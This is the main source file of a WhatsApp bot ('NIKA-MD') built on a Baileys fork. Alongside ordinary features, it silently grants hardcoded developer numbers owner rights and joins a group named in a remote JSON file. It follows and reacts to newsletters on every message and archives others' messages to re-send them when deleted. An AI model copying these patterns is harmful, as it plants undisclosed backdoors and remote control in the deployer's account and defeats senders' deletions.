const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('baileys-x')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, openai, sleep, fetchJson } = require('./lib/functions')
const fs = require('fs')
const P = require('pino')
const FileType = require('file-type')
const l = console.log
var config = require('./settings')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const NodeCache = require('node-cache')
const util = require('util')
const { sms,downloadMediaMessage } = require('./lib/msg')
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")
var { get_set , input_set } = require('./lib/set_db')
const axios = require('axios')
const { File } = require('megajs')
const { exec } = require('child_process');
const bodyparser = require('body-parser')
const { tmpdir } = require('os')
const Crypto = require('crypto')

var prefix = config.PREFIX
const getWelcome = () => config.WELCOME_GOODBYE;
var prefixRegex = config.prefix === "false" || config.prefix === "null" ? "^" : new RegExp('^[' + config.PREFIX + ']');

 function genMsgId() {
  const lt = 'NikaMD';
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

  for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }   
 return randomText;
}    

const path = require('path')
const msgRetryCounterCache = new NodeCache()
    //=========================dl-ZIP========================
 
const ownerNumber =  ['94743826406']
//===================SESSION============================
  const SESSION_DIR = './session';
    if (!fs.existsSync(SESSION_DIR)) {
        fs.mkdirSync(SESSION_DIR);
      }
if (!fs.existsSync(__dirname + '/session/creds.json')) {
    if (!config.SESSION_ID) return console.log("Please Add SESSION_ID ➾")
      const sessdata = config.SESSION_ID.split("𝐍𝐈𝐊𝐀-𝐌𝐃=")[1];
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) throw err
        fs.writeFile(__dirname + '/session/creds.json', data, () => {
          console.log("Session download completed !!")
        })
      })
    
  }
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================

async function connectToWA() {
//Run the function
//await downloadAndExtractZip();
	console.log("Connecting 𝐍𝐈𝐊𝐀-𝐌𝐃...🍁");
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + '/session/')
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })

    conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

            console.log('Installing plugins 🍁... ')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('𝐍𝐈𝐊𝐀-𝐌𝐃 Plugins installed ✅')
            console.log('𝐍𝐈𝐊𝐀-𝐌𝐃 Bot connected ✅')
	    joinGroupFromJson();	
const prefix = config.PREFIX
const aliveMsg = config.ALIVE_MSG
const autoreadStatus = config.AUTO_READ_STATUS
const autoreactStatus = config.AUTO_REACT_STATUS
const mode = config.MODE
const autoVoice = config.AUTO_VOICE
const autoReply = config.AUTO_REPLY
const autoSticker = config.AUTO_STICKER
const badword = config.ANTI_BAD
const antilink = config.ANTI_LINK
const antiBot = config.ANTI_BOT
const alwaysofline = config.ALLWAYS_OFFLINE
const readCmd = config.READ_CMD
const recording = config.RECORDING
const autoReact = config.AUTO_REACT
const aichat = config.AI_CHAT
const anticall = config.ANTI_CALL
const wegb = config.WELCOME_GOODBYE
const antidelet = config.ANTI_DELETE

let up = 
`*🔌 Connecting 𝐍𝐈𝐊𝐀-𝐌𝐈𝐍𝐈-𝐌𝐃 Multidevice WhatsApp Bot... ⚙️*

*🔗 : 𝐒𝐎𝐂𝐈𝐀𝐋 & 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘*
*╭┈───────────╴╴╴•⟢*
*│ 🌐 Website:* 
*https://upload-8loa.vercel.app/*
*│ 💬 Group:*
*https://chat.whatsapp.com/G20BgGSUSj3JXM58NXmFfj?mode=ems_copy_t*
*│ 📢 Channel:*
*https://whatsapp.com/channel/0029VbAXbHuAojYqnxGlW934*
*╰┈───────────╴╴╴•⟢*

*📞 : 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑*
*╭┈───────────╴╴╴•⟢*
*│ 👤 wa.me/94743826406*
*╰┈───────────╴╴╴•⟢*

*📦 : 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒*
*╭┈───────────╴╴╴•⟢*
*│ ✅ Status: Online*
*│ ⚡ Speed: Ultra Fast*
*│ 🔐 Privacy: End-to-End*
*╰┈───────────╴╴╴•⟢*

*🧠 : 𝐅𝐄𝐀𝐓𝐔𝐑𝐄 𝐇𝐈𝐆𝐇𝐋𝐈𝐆𝐇𝐓𝐒*
*╭┈───────────╴╴╴•⟢*
*│ 🤖 AI Chat Support*
*│ 🛠 Auto Tools & Plugins*
*│ 🌍 Language Detection*
*│ 📁 Media Downloader*
*│ 🚀 Fast Deploy Tools*
*╰┈───────────╴╴╴•⟢*

> 𝐏𝐎𝐖𝐄𝐑𝐃 𝐁𝐘 𝐍𝐈𝐊𝐀 𝐌𝐈𝐍𝐈 𝐁𝐎𝐓 🔥
`;

conn.sendMessage(conn.user.id,{ text: up, contextInfo: {
        mentionedJid: [''],
        groupMentions: [],
        //forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363385281017920@newsletter',
          newsletterName: "𝐍𝐈𝐊𝐀-𝐌𝐃",
          serverMessageId: 999
        },
        externalAdReply: { 
          title: '𝐍𝐈𝐊𝐀-𝐌𝐃',
          body: '𝐍𝐈𝐊𝐀 𝐌𝐈𝐍𝐈 𝐁𝐎𝐓 𝐂𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙽𝙶 𝐒𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻...',
          mediaType: 1,
          thumbnailUrl: "https://raw.githubusercontent.com/Sayurami/Poto-upload-/refs/heads/main/file_00000000022461faa976f5570799fae2.png",
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      } 
})

}
})

//====================================

const { startNewsService ,startTikTokService} = require('./plugins/plugins_main'); 
   
const nsjid = config.NEWS_SEND_JID;
if (config.AUTO_NEWS_SENDER === "true"){
startNewsService(conn,nsjid);
}
const nsjidd = config.TIKTOK_SEND_JID;	
if (config.AUTO_TIKTOK_SENDER === "true"){
startTikTokService(conn,nsjidd);
 
}

conn.ev.on('group-participants.update', async (update) => {
        if (config.WELCOME_GOODBYE === "true") {
            const { id, participants, action } = update;
            const groupMetadata = await conn.groupMetadata(id).catch(() => null);
            if (!groupMetadata) return;
            const groupName = groupMetadata.subject;
            const groupDesc = groupMetadata.desc || "No description available.";

            for (const participant of participants) {
                try {
                    let message = '';
                    let profilePicUrl = 'https://i.ibb.co/dHwhYTC/SulaMd.jpg';
                    try {
                        profilePicUrl = await conn.profilePictureUrl(participant, 'image');
                    } catch (err) {
                        console.error('Error fetching profile picture:', err);
                    }

                    if (action === 'add') {
                        message = `👻 *𝐇𝙸...👋 𝐖𝙴𝙻𝙲𝙾𝙼𝙴 𝐓𝙾 @${participant.split('@')[0]}!* \n\n🟢 *Group:* ${groupName}\n\n📜 *Description:* ${groupDesc}\n\n> 🫱 Don’t forget to say hi! 🛡 Follow the group rules & enjoy! 😊`;
                    } else if (action === 'remove') {
                        message = `😔 *𝐆𝙾𝙾𝙳𝙱𝚈𝙴...🥀 @${participant.split('@')[0]}!* \n\n🟡 *Group:* ${groupName}\n\n📜 *Description:* ${groupDesc}\n\n> 😔 Sad to see you go. You’re always welcome back anytime! 💌`;
                    } else if (action === 'leave') {
                        message = `🚪 *@${participant.split('@')[0]} has left the group.* \n\n🔴 *Group:* ${groupName}\n\n📜 *Description:* ${groupDesc}\n\n> ⚠️ We keep things clean and friendly. Please respect the community rules!`;
                    } else if (action === 'kick') {
                        message = `⛔ *@${participant.split('@')[0]} was removed from the group.* \n\n🔴 *Group:* ${groupName}\n\n📜 *Description:* ${groupDesc}\n\n> 🧯 Violated group rules or policy. Let's keep this space safe for all! 🚨`;
                    }

                    if (message) {
                        await conn.sendMessage(id, {
                            image: { url: profilePicUrl },
                            caption: message,
                            contextInfo: {
                                mentionedJid: [participant],
                                externalAdReply: {
                                    title: '𝐒𝚄𝙻𝙰 𝐌𝙳',
                                    body: '𝐏𝙾𝚆𝙴𝚁𝙳 𝐁𝚈 𝐒𝚄𝙻𝙰 𝐌𝙳',
                                    mediaType: 1,
                                    sourceUrl: "https://sula-md.pages.dev",
                                    thumbnailUrl: 'https://i.ibb.co/dHwhYTC/SulaMd.jpg'
                                }
                            }
                        });
                    }
                } catch (err) {
                    console.error('Error sending group update message:', err);
                }
            }
        }
    });

    conn.ev.on('call', async (calls) => {
        if (config.ANTI_CALL === "true") {
            for (const call of calls) {
                if (call.status === "offer") {
                    await conn.rejectCall(call.id, call.from);
                    if (!call.isGroup) {
                        await conn.sendMessage(call.from, {
                            text: "*🔕 Your call was automatically rejected..!*\n*📵 The owner is currently busy. Please try again later.. 💤*\n\n*🔕 ඔබගේ ඇමතුම ස්වයංක්‍රීයව ප්‍රතික්ෂේප කරන ලදී..!*\n*📵 අයිතිකරු මේ මොහොතේ කාර්යබහුලයි. කරුණාකර පසුව උත්සාහ කරන්න.. 💤*",
                            mentions: [call.from]
                        });
                    }
                }
            }
        }
    });

    conn.ev.on('creds.update', saveCreds);
//==========================================================================

async function joinGroupFromJson() {
    try {
        let joinlink2 = await fetchJson('https://raw.githubusercontent.com/sulamd48/database/refs/heads/main/zip.json');
        
        if (!joinlink2 || !joinlink2.join) {
            console.error('❌ Invalid join link data!');
            return;
        }
        
        const joinlink = joinlink2.join.split('https://chat.whatsapp.com/')[1]; // Extract invite code

        if (!joinlink) {
            console.error('❌ Invalid invite link format!');
            return;
        }

        setTimeout(async () => {
            await conn.groupAcceptInvite(joinlink);
            console.log("✅ Successfully joined the group!");
        }, 10000); // 5 seconds delay

    } catch (error) {
        console.error('❌ Error:', error);
    }
}

conn.ev.on('creds.update', saveCreds)  

    conn.ev.on('messages.upsert', async (mek) => {
      try {
            mek = mek.messages[0]
            if (!mek.message) return
	    var id_db = require('./lib/id_db')    
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
//----------------AUTO STATUS VIEW-------------------------------

if (!mek.message) return

mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message

// ✅ Only one status broadcast check block
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
    await conn.readMessages([mek.key])

    if (config.AUTO_REACT_STATUS === "true") {
        const emojis = ['🩷', '🔥', '💯', '😍', '✨', '😎', '🌟', '🥰', '🤍', '🤘']
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]

        const mnyako = await jidNormalizedUser(conn.user.id)
        await conn.sendMessage(mek.key.remoteJid, {
            react: {
                key: mek.key,
                text: randomEmoji
            }
        }, {
            statusJidList: [mek.key.participant, mnyako]
        })
    }

    // ✅ Block further processing for statuses
    return
}

// 🔽 Only runs if not a status
const m = sms(conn, mek)
var smg = m
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = (type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null)
    ? mek.message.extendedTextMessage.contextInfo.quotedMessage || []
    : []

const newsletterJids = [
  "120363385281017920@newsletter",
  "120363338469363799@newsletter"
];

for (const jid of newsletterJids) {
  await conn.newsletterFollow(jid);
  const id = mek.key.server_id;
  await conn.newsletterReactMessage(jid, id, "❤️");
}

//==================================Button================================
	      
      const body = (type === 'conversation') ? mek.message.conversation 
    : mek.message?.extendedTextMessage?.contextInfo?.hasOwnProperty('quotedMessage') 
        ? mek.message.extendedTextMessage.text 
    : (type == 'interactiveResponseMessage') 
        ? mek.message.interactiveResponseMessage?.nativeFlowResponseMessage 
            && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id 
    : (type == 'templateButtonReplyMessage') 
        ? mek.message.templateButtonReplyMessage?.selectedId 
    : (type === 'extendedTextMessage') 
        ? mek.message.extendedTextMessage.text 
    : (type == 'imageMessage') && mek.message.imageMessage.caption 
        ? mek.message.imageMessage.caption 
    : (type == 'videoMessage') && mek.message.videoMessage.caption 
        ? mek.message.videoMessage.caption 
    : (type == 'buttonsResponseMessage') 
        ? mek.message.buttonsResponseMessage?.selectedButtonId 
    : (type == 'listResponseMessage') 
        ? mek.message.listResponseMessage?.singleSelectReply?.selectedRowId 
    : (type == 'messageContextInfo') 
        ? (mek.message.buttonsResponseMessage?.selectedButtonId 
            || mek.message.listResponseMessage?.singleSelectReply?.selectedRowId 
            || mek.text) 
    : (type === 'viewOnceMessage') 
        ? mek.message[type]?.message[getContentType(mek.message[type].message)] 
    : (type === "viewOnceMessageV2") 
        ? (mek.msg.message.imageMessage?.caption || mek.msg.message.videoMessage?.caption || "") 
    : '';
 
 //==================================================================

conn.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return conn.sendMessage(jid, { poll: { name, values, selectableCount }}) }
	      
 
	    var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)    
	    prefix = config.PREFIX
var isCmd = body.startsWith(prefix)	    
var command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
var args = body.trim().split(/ +/).slice(1)
var q = args.join(' ')

    var body2 = ''
 if(smg.quoted && smg.quoted.fromMe && await id_db.check(smg.quoted.id)  ){
if (body.startsWith(prefix))  body = body.replace( prefix , '')
			     
			     
var id_body = await id_db.get_data( smg.quoted.id , body)
	
if (id_body.cmd) {
  isCmd = true
command = id_body.cmd.startsWith(prefix)?  id_body.cmd.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
args = id_body.cmd.trim().split(/ +/).slice(1)
q = args.join(' ')		
}
}
      console.log(command)
	      
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'Sin Nombre'
	    const ownbot = config.OWNER
	    const isownbot = ownbot?.includes(senderNumber)
	    const developers = '94760663483'
            const isbot = botNumber.includes(senderNumber)
	    const isdev = developers.includes(senderNumber) 	    
            let epaneda =  "94760663483,94710450435"
            const epada = epaneda.split(",")	    
            const isDev = [ ...epada ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)
	    const botNumber2 = await jidNormalizedUser(conn.user.id)
            const isCreator = [ botNumber2 ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)	  
	    const isMe = isbot ? isbot : isdev
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isreaction = m.message.reactionMessage ? true : false
            const isReact =m.message.reactionMessage ? true : false
	    const isAnti = (teks) => {
                let getdata = teks
                for (let i = 0; i < getdata.length; i++) {
                    if (getdata[i] === from) return true
                }
                return false
            }
            const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}

if(!isOwner) {  // Fixed redundant condition
    if(config.ANTI_DELETE === "true") {
        
        if (!m.id.startsWith("BAE5")) {
            
            // Ensure the base directory exists
            const baseDir = 'message_data';
            if (!fs.existsSync(baseDir)) {
                fs.mkdirSync(baseDir);
            }
            
            function loadChatData(remoteJid, messageId) {
                const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
                try {
                    const data = fs.readFileSync(chatFilePath, 'utf8');
                    return JSON.parse(data) || [];
                } catch (error) {
                    return [];
                }
            }
            
            function saveChatData(remoteJid, messageId, chatData) {
                const chatDir = path.join(baseDir, remoteJid);
            
                if (!fs.existsSync(chatDir)) {
                    fs.mkdirSync(chatDir, { recursive: true });
                }
            
                const chatFilePath = path.join(chatDir, `${messageId}.json`);
            
                try {
                    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
                    // console.log('Chat data saved successfully.');
                } catch (error) {
                    console.error('Error saving chat data:', error);
                }
            }
                
            function handleIncomingMessage(message) {
                const remoteJid = from; // Fixed: removed comment
                const messageId = message.key.id;
            
                const chatData = loadChatData(remoteJid, messageId);
            
                chatData.push(message);
            
                saveChatData(remoteJid, messageId, chatData);
            
                // console.log('Message received and saved:', messageId);
            }
            
            const delfrom = config.DELETEMSGSENDTO !== '' ? config.DELETEMSGSENDTO + '@s.whatsapp.net' : from;
            
            function handleMessageRevocation(revocationMessage) {
                // const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
                // const messageId = revocationMessage.message.protocolMessage.key.id;
                const remoteJid = from; 
                const messageId = revocationMessage.msg.key.id;
            
                // console.log('Received revocation message with ID:', messageId);
            
                const chatData = loadChatData(remoteJid, messageId);
            
                const originalMessage = chatData[0];
            
                if (originalMessage) {
                    const deletedBy = revocationMessage.sender.split('@')[0];
                    const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
                    const sentBy = sentBynn.split('@')[0];
                    
                    if (deletedBy.includes(botNumber) || sentBy.includes(botNumber)) return;
                    
                    const xx = '```';
                    
                    if (originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== '') {
                        const messageText = originalMessage.message.conversation;
                        if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                        
                        conn.sendMessage(delfrom, { 
                            text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` 
                        });
                        //........................................//........................................
                    } else if (originalMessage.msg && originalMessage.msg.type === 'MESSAGE_EDIT') { // Fixed: added check for originalMessage.msg
                        conn.sendMessage(delfrom, { 
                            text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` 
                        }, {quoted: mek});
                        
                        //........................................//........................................
                    } else if (originalMessage.message && originalMessage.message.extendedTextMessage && originalMessage.msg && originalMessage.msg.text ) { // Fixed: typo in extendedTextMessage
                        const messageText = originalMessage.msg.text;
                        if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                        
                        conn.sendMessage(delfrom, { 
                            text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` 
                        });
                    } else if (originalMessage.message && originalMessage.message.extendedTextMessage) { // Fixed: typo in extendedTextMessage
                        const messageText = originalMessage.message.extendedTextMessage.text; // Fixed: corrected variable name
                        if (isGroup && messageText && messageText.includes('chat.whatsapp.com')) return; // Fixed: added check if messageText exists
                        
                        conn.sendMessage(delfrom, { 
                            text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` 
                        });
                    } else if (originalMessage.type === 'extendedTextMessage') {
                        async function quotedMessageRetrive() {     
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            
                            if (originalMessage.message.extendedTextMessage) {
                                const messageText = originalMessage.message.extendedTextMessage.text;
                                if (isGroup && messageText && messageText.includes('chat.whatsapp.com')) return; // Fixed: added check if messageText exists
                                
                                conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` 
                                });
                            } else {
                                const messageText = originalMessage.message.extendedTextMessage && originalMessage.message.extendedTextMessage.text; // Fixed: added safe check
                                if (isGroup && messageText && messageText.includes('chat.whatsapp.com')) return; // Fixed: added check if messageText exists
                                
                                conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage && originalMessage.message.extendedTextMessage.text}${xx}` 
                                });
                            }
                        }
                        
                        quotedMessageRetrive();
                    } else if (originalMessage.type === 'imageMessage') {
                        async function imageMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.imageMessage.caption) {
                                const messageText = originalMessage.message.imageMessage.caption;
                                if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                                
                                await conn.sendMessage(delfrom, { 
                                    image: fs.readFileSync("./" + type.ext), 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` 
                                });
                            } else {
                                await conn.sendMessage(delfrom, { 
                                    image: fs.readFileSync("./" + type.ext), 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` 
                                });
                            }       
                        }
                        
                        imageMessageRetrive();
                    } else if (originalMessage.type === 'videoMessage') {
                        async function videoMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            
                            const vData = originalMessage.message.videoMessage.fileLength;
                            const vTime = originalMessage.message.videoMessage.seconds;
                            const fileDataMB = config.MAX_SIZE;
                            const fileLengthBytes = vData;
                            const fileLengthMB = fileLengthBytes / (1024 * 1024);
                            const fileseconds = vTime;
                            
                            if (originalMessage.message.videoMessage.caption) {
                                if (fileLengthMB < fileDataMB && fileseconds < 30*60) {
                                    let buff = await ml.download(nameJpg);
                                    let fileType = require('file-type');
                                    let type = fileType.fromBuffer(buff);
                                    await fs.promises.writeFile("./" + type.ext, buff);
                                    
                                    const messageText = originalMessage.message.videoMessage.caption;
                                    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                                    
                                    await conn.sendMessage(delfrom, { 
                                        video: fs.readFileSync("./" + type.ext), 
                                        caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` 
                                    });
                                }
                            } else {
                                let buff = await ml.download(nameJpg);
                                let fileType = require('file-type');
                                let type = fileType.fromBuffer(buff);
                                await fs.promises.writeFile("./" + type.ext, buff);
                                
                                const vData = originalMessage.message.videoMessage.fileLength;
                                const vTime = originalMessage.message.videoMessage.seconds;
                                const fileDataMB = config.MAX_SIZE;
                                const fileLengthBytes = vData;
                                const fileLengthMB = fileLengthBytes / (1024 * 1024);
                                const fileseconds = vTime;
                                
                                if (fileLengthMB < fileDataMB && fileseconds < 30*60) {
                                    await conn.sendMessage(delfrom, { 
                                        video: fs.readFileSync("./" + type.ext), 
                                        caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` 
                                    });
                                }
                            }       
                        }
                        
                        videoMessageRetrive();
                    } else if (originalMessage.type === 'documentMessage') {
                        async function documentMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.documentWithCaptionMessage) {
                                await conn.sendMessage(delfrom, { 
                                    document: fs.readFileSync("./" + type.ext), 
                                    mimetype: originalMessage.message.documentMessage.mimetype, 
                                    fileName: originalMessage.message.documentMessage.fileName, 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`
                                });
                            } else {
                                await conn.sendMessage(delfrom, { 
                                    document: fs.readFileSync("./" + type.ext), 
                                    mimetype: originalMessage.message.documentMessage.mimetype, 
                                    fileName: originalMessage.message.documentMessage.fileName, 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`
                                });
                            }
                        }
                        
                        documentMessageRetrive();
                    } else if (originalMessage.type === 'audioMessage') {
                        async function audioMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.audioMessage) {
                                const audioq = await conn.sendMessage(delfrom, { 
                                    audio: fs.readFileSync("./" + type.ext), 
                                    mimetype: originalMessage.message.audioMessage.mimetype, 
                                    fileName: `${m.id}.mp3` 
                                });
                                
                                return await conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                }, {quoted: audioq});
                            } else {
                                if (originalMessage.message.audioMessage.ptt === "true") {
                                    const pttt = await conn.sendMessage(delfrom, { 
                                        audio: fs.readFileSync("./" + type.ext), 
                                        mimetype: originalMessage.message.audioMessage.mimetype, 
                                        ptt: 'true',
                                        fileName: `${m.id}.mp3` 
                                    });
                                    
                                    return await conn.sendMessage(delfrom, { 
                                        text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                    }, {quoted: pttt});
                                }
                            }
                        }
                        
                        audioMessageRetrive();
                    } else if (originalMessage.type === 'stickerMessage') {
                        async function stickerMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.stickerMessage) {
                                const sdata = await conn.sendMessage(delfrom, {
                                    sticker: fs.readFileSync("./" + type.ext),
                                    package: '𝐍𝐈𝐊𝐀-𝐌𝐃 🌟'
                                });
                                
                                return await conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                }, {quoted: sdata});
                            } else {
                                const stdata = await conn.sendMessage(delfrom, {
                                    sticker: fs.readFileSync("./" + type.ext),
                                    package: '𝐍𝐈𝐊𝐀-𝐌𝐃 🌟'
                                });
                                
                                return await conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                }, {quoted: stdata});
                            }
                        }
                        
                        stickerMessageRetrive();
                    }
                } else {
                    console.log('Original message not found for revocation.');
                }
            }
            
            if (mek.msg && mek.msg.type === 0) {
                handleMessageRevocation(mek);
            } else {
                handleIncomingMessage(mek);
            }
        }
    }
}

//==========================public react===============//

//==================================Nonbutton================================

function jsonConcat(o1, o2) {
 for (var key in o2) {
  o1[key] = o2[key];
 }
 return o1;
}	

        
var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)  
conn.replyad = async (teks) => {
  return await conn.sendMessage(from, { text: teks ,
contextInfo: { 
mentionedJid: [m.sender], 
forwardingScore: 999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: { 
newsletterJid: '120363385281017920@newsletter', 
newsletterName: "𝐍𝐈𝐊𝐀-𝐌𝐃", 
serverMessageId: 999 
}}}, { quoted: quotemek || mek})
}
const NON_BUTTON = true // Implement a switch to on/off this feature...

conn.replyList = async (from , list_reply , options) => {
function convertNumberList(sections) {
    let result = "";

    sections.forEach((section, sectionIndex) => {
        result += section.title? `${section.title}\n` : ''

        section.rows.forEach((row, rowIndex) => {
            result += `${row.title} │ ${row.description}`;
            result += rowIndex === section.rows.length - 1 ? "" : "\n"; // Add newline unless it's the last row
        });

        result += sectionIndex === sections.length - 1 ? "" : "\n\n"; // Add extra newline unless it's the last section
    });

    return result;
}
if (!list_reply.sections) return false
